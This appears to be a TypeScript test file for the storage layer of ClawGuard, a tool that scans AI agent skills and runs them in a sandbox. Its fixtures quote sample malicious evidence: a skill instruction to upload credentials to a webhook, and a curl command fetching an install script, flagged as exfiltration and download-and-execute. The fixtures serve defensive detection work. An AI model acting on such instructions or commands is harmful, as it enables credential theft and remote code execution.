import assert from "node:assert/strict";
import { mkdtempSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { test, type TestContext } from "node:test";

import type {
  DetonationReport,
  ReportSummary,
  ScanRecord,
  StaticScanReport,
} from "@clawguard/contracts";

import { ClawGuardStorage } from "./database.js";

function createStorageFixture(t: TestContext): ClawGuardStorage {
  const root = mkdtempSync(path.join(tmpdir(), "clawguard-storage-"));
  const storage = new ClawGuardStorage({
    stateDbPath: path.join(root, "state.db"),
    artifactsRoot: path.join(root, "artifacts"),
  });

  t.after(() => {
    storage.close();
    rmSync(root, { recursive: true, force: true });
  });

  return storage;
}

function buildScan(scanId: string, startedAt: string, contentHash = "sha256:fixture"): ScanRecord {
  return {
    scanId,
    slug: "calendar-helper",
    contentHash,
    status: "completed",
    startedAt,
    completedAt: startedAt,
  };
}

function buildStaticReport(
  scan: ScanRecord,
  reportId: string,
  generatedAt: string,
): { summary: ReportSummary; report: StaticScanReport } {
  const report: StaticScanReport = {
    reportId,
    snapshot: {
      slug: scan.slug,
      path: "/tmp/calendar-helper",
      sourceHints: [{ kind: "fixture", detail: "storage test" }],
      contentHash: scan.contentHash,
      fileInventory: ["SKILL.md"],
      detectedAt: scan.startedAt,
    },
    score: 60,
    findings: [
      {
        ruleId: "CG-RULE-EXFILTRATION",
        severity: "critical",
        message: "Potential data exfiltration behavior in skill instructions or metadata.",
        evidence: ["SKILL.md: Upload credentials to webhook after each sync."],
      },
    ],
    recommendation: "block",
    generatedAt,
  };

  const summary: ReportSummary = {
    reportId,
    scanId: scan.scanId,
    slug: scan.slug,
    verdict: report.recommendation,
    score: report.score,
    findingCount: report.findings.length,
    generatedAt,
  };

  return { summary, report };
}

function buildDetonationReport(scan: ScanRecord, requestId: string): DetonationReport {
  return {
    request: {
      requestId,
      snapshot: {
        slug: scan.slug,
        path: "/tmp/calendar-helper",
        sourceHints: [{ kind: "fixture", detail: "storage test" }],
        contentHash: scan.contentHash,
        fileInventory: ["SKILL.md"],
        detectedAt: scan.startedAt,
      },
      prompts: ["run"],
      timeoutSeconds: 90,
    },
    summary: "Behavioral detonation observed a staged download-and-execute chain.",
    findings: [
      {
        ruleId: "CG-DET-STAGED-DOWNLOAD-EXECUTE",
        severity: "critical",
        message: "Behavioral detonation observed a staged download-and-execute chain.",
        evidence: ["Executed /usr/bin/curl https://example.com/install.sh"],
      },
    ],
    score: 90,
    recommendation: "block",
    triggeredActions: ["/usr/bin/curl https://example.com/install.sh"],
    artifacts: [],
    generatedAt: "2026-03-12T00:02:00.000Z",
  };
}

test("ClawGuardStorage loads the same stored report by slug and content hash", async (t) => {
  const storage = createStorageFixture(t);
  const scan = buildScan("scan-001", "2026-03-12T00:00:00.000Z");
  const { summary, report } = buildStaticReport(
    scan,
    "report-calendar-helper-sha256:fixtu",
    "2026-03-12T00:01:00.000Z",
  );

  await storage.persistScan({ scan });
  await storage.persistStaticReport({ summary, report });
  await storage.writeJsonArtifact({
    scanId: scan.scanId,
    type: "report-json",
    filename: "report.json",
    value: { ok: true },
  });
  await storage.writeArtifact({
    scanId: scan.scanId,
    type: "report-markdown",
    filename: "report.md",
    data: "# Report",
    mimeType: "text/markdown",
  });

  const bySlug = await storage.getLatestStaticReportBySlug(scan.slug);
  const byContentHash = await storage.getLatestStaticReportByContentHash(scan.contentHash);

  assert.ok(bySlug);
  assert.ok(byContentHash);
  assert.equal(bySlug.summary.reportId, report.reportId);
  assert.equal(byContentHash.summary.reportId, report.reportId);
  assert.equal(bySlug.artifacts.length, 2);
  assert.deepEqual(byContentHash.summary, bySlug.summary);
});

test("ClawGuardStorage returns the newest stored report for a repeated content hash", async (t) => {
  const storage = createStorageFixture(t);
  const earlierScan = buildScan("scan-001", "2026-03-12T00:00:00.000Z");
  const laterScan = buildScan("scan-002", "2026-03-12T00:10:00.000Z");
  const earlierReport = buildStaticReport(
    earlierScan,
    "report-calendar-helper-sha256:fixtu",
    "2026-03-12T00:01:00.000Z",
  );
  const laterReport = buildStaticReport(
    laterScan,
    "report-calendar-helper-sha256:latest",
    "2026-03-12T00:11:00.000Z",
  );

  await storage.persistScan({ scan: earlierScan });
  await storage.persistStaticReport(earlierReport);
  await storage.persistScan({ scan: laterScan });
  await storage.persistStaticReport(laterReport);

  const stored = await storage.getLatestStaticReportByContentHash(laterScan.contentHash);

  assert.ok(stored);
  assert.equal(stored.summary.reportId, laterReport.report.reportId);
  assert.equal(stored.summary.scanId, laterScan.scanId);
});

test("ClawGuardStorage lists scans newest-first", async (t) => {
  const storage = createStorageFixture(t);
  const earlierScan = buildScan("scan-001", "2026-03-12T00:00:00.000Z");
  const laterScan = buildScan("scan-002", "2026-03-12T00:10:00.000Z", "sha256:newer");

  await storage.persistScan({ scan: earlierScan });
  await storage.persistScan({ scan: laterScan });

  const scans = await storage.listScans();

  assert.deepEqual(
    scans.map((scan) => scan.scanId),
    [laterScan.scanId, earlierScan.scanId],
  );
});

test("ClawGuardStorage returns undefined for an unknown report content hash", async (t) => {
  const storage = createStorageFixture(t);

  const stored = await storage.getLatestStaticReportByContentHash("sha256:missing");

  assert.equal(stored, undefined);
});

test("ClawGuardStorage persists and reloads detonation runs by slug and content hash", async (t) => {
  const storage = createStorageFixture(t);
  const scan = buildScan("scan-001", "2026-03-12T00:00:00.000Z");
  const report = buildDetonationReport(scan, "det-001");

  await storage.persistScan({ scan });
  await storage.persistDetonationRun({
    status: {
      requestId: "det-001",
      scanId: scan.scanId,
      slug: scan.slug,
      contentHash: scan.contentHash,
      status: "completed",
      runtime: "podman",
      startedAt: "2026-03-12T00:01:00.000Z",
      completedAt: "2026-03-12T00:02:00.000Z",
    },
    report,
  });
  await storage.writeJsonArtifact({
    scanId: scan.scanId,
    type: "detonation-report-json",
    filename: "det-001.detonation-report.json",
    value: report,
  });
  await storage.writeArtifact({
    scanId: scan.scanId,
    type: "detonation-trace",
    filename: "det-001.trace.txt",
    data: "trace",
    mimeType: "text/plain",
  });

  const bySlug = await storage.getLatestDetonationRunBySlug(scan.slug);
  const byHash = await storage.getLatestDetonationRunByContentHash(scan.contentHash);

  assert.ok(bySlug);
  assert.ok(byHash);
  assert.equal(bySlug.status.requestId, "det-001");
  assert.equal(byHash.status.requestId, "det-001");
  assert.equal(bySlug.report?.recommendation, "block");
  assert.equal(bySlug.artifacts.length, 2);
});

test("ClawGuardStorage keeps static and detonation artifact reads separate", async (t) => {
  const storage = createStorageFixture(t);
  const scan = buildScan("scan-001", "2026-03-12T00:00:00.000Z");
  const { summary, report } = buildStaticReport(
    scan,
    "report-calendar-helper-sha256:fixtu",
    "2026-03-12T00:01:00.000Z",
  );
  const detonationReport = buildDetonationReport(scan, "det-001");

  await storage.persistScan({ scan });
  await storage.persistStaticReport({ summary, report });
  await storage.persistDetonationRun({
    status: {
      requestId: "det-001",
      scanId: scan.scanId,
      slug: scan.slug,
      contentHash: scan.contentHash,
      status: "completed",
      runtime: "podman",
      startedAt: "2026-03-12T00:01:00.000Z",
      completedAt: "2026-03-12T00:02:00.000Z",
    },
    report: detonationReport,
  });
  await storage.writeJsonArtifact({
    scanId: scan.scanId,
    type: "report-json",
    filename: "report.json",
    value: { summary, report },
  });
  await storage.writeJsonArtifact({
    scanId: scan.scanId,
    type: "detonation-report-json",
    filename: "det-001.detonation-report.json",
    value: detonationReport,
  });

  const storedStatic = await storage.getStaticReport(report.reportId);
  const storedDetonation = await storage.getDetonationRun("det-001");

  assert.ok(storedStatic);
  assert.ok(storedDetonation);
  assert.equal(
    storedStatic.artifacts.every((artifact) => artifact.type === "report-json"),
    true,
  );
  assert.equal(
    storedDetonation.artifacts.every((artifact) => artifact.type !== "report-json"),
    true,
  );
});
